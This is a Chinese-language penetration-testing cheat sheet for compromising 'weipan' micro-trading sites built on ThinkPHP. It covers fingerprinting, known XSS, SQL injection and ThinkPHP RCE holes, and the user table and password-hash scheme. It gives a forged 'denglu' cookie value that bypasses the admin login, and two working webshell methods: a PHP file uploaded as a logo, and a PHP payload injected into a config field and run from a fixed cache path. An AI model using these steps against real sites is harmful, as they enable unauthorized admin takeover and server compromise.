# weipan

---

微盘框架特征：

```
网站标题的图标默认是绿色的微字（也可以在浏览器历史记录中查看）
用户在前端登陆后访问的是伪静态页面，如good/pid/2/token/xxxxxxx.html
登陆页面：/passport/login/index/?lang=zh-cn
	     /index/login/login/token/xxxxxxxx.html
```

RCE：

```
1.用户注册填信息的地方存在xss
2.商品行情页面good/pid/2 存在sql注入
3.以thinkphp框架二次开发的框架，存在thinkphp的RCE
4.thinkphp的日志泄露，搜索error可能找到sql注入的地方
5.其他漏洞：https://www.cnblogs.com/-qing-/p/10693139.html
```

基本信息

```
表名：
|-wp_userinfo  #用户表，管理员和用户信息存放的表
|--username用户名
|--upwd 密码md5
|--utime 注册时间戳，默认upwd是密码+utime的md5（具体需要看后台登陆页面是怎么校验登陆的）
|--otype 3为管理员，4为平台用户
|-wp_whitelist  # 可以设置白名单IP访问后台
设置域名白名单访问：一般可以通过不用域名访问目标站点，但是只能通过一个域名访问目标站点后台
/Application/Common/Conf/site.php
'siteurl' => 'xxx1.com',
'siteurlreg' => 'https://xxx1.com',  #  
'siteurladm' => 'admin.xxx1.com',  # 能访问后台的白名单域名
'appdownurl' => 'https://xxx2.com',  # app下载页面

```

后台登陆绕过登陆

- 教程：https://www.freebuf.com/articles/web/254396.html

- 将cookie中denglu参数改成（otype是权限，token是验证）

```
denglu=think:{"otype":"3","userid":"","username":"","token":"3c341b110c44ad9e7da4160e4f865b63"}
```

后台get5he11 -1

- 教程：https://www.freebuf.com/articles/web/254396.html

```
/参数设置/基本设置/LOGO/选择文件/
通过源代码查看logo处可以看到路径，一般在public/uploads/20210101/md5.php（上传日期/文件md5）
```

后台get5he11 -2

- 教程：https://forum.90sec.com/t/topic/988

```
/参数设置/添加配置/依次输入test、test、test、文本、参数配置
/参数设置/参数设置/在test拦中输入 ：
---
 "
phpinfo();//
---
访问前端页面进行缓存刷新后直接访问：（固定路径文件）
/runtime/cache/3a/8e4c06e471595f6eb262bb9b5582d9.php

PS：如果没有参数设置，可能只是删除了导航，没有删除实际功能
可以直接访问/setup/addsetup.html  添加配置
```

